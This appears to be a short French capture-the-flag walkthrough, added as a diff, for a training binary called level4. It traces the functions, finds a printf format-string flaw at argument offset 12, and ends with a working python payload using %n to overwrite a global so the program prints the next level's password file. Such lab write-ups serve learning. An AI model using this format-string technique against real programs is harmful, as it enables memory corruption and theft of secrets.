@@ -1,0 +1,26 @@
+info functions:
+0x08048444  p
+0x08048457  n
+0x080484a7  main
+
+main() appelle n() qui appelle p()
+printf dans p() qui print ce qu on a input precedemment (recupere par fgets)
+apres avoir appele p(), n() compare un le pointer 0x8049810 avec $0x1025544, si ca match il call system("/bin/cat /home/user/level5/.pass")
+on va modifier le contenu de l adresse 0x8049810 pour qu il == $0x1025544 (16930116 en decimal)
+
+>r
+AAAAAAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x                            
+AAAAAAAA b7ff26b0 bffff664 b7fd0ff4 0 0 bffff628 804848d bffff420 200 b7fd1ac0 b7ff37d0 41414141 41414141 20782520 25207825
+
+notre buffer en argument 12
+
+
+payload:
+[adresse a modifier]
++ [contenu de ladresse a modifier pour que ca donne 0x1025544 (16930116 en decimal mais -4 car on 
+	a deja ecrit 4 bytes avant donc 16930112)]
++ [%12$n]
+
+python -c 'print "\x08\x04\x98\x10"[::-1] + "%16930112c" + "%12$n"' > /tmp/exploit4
+
+cat /tmp/exploit4 - | ./level4
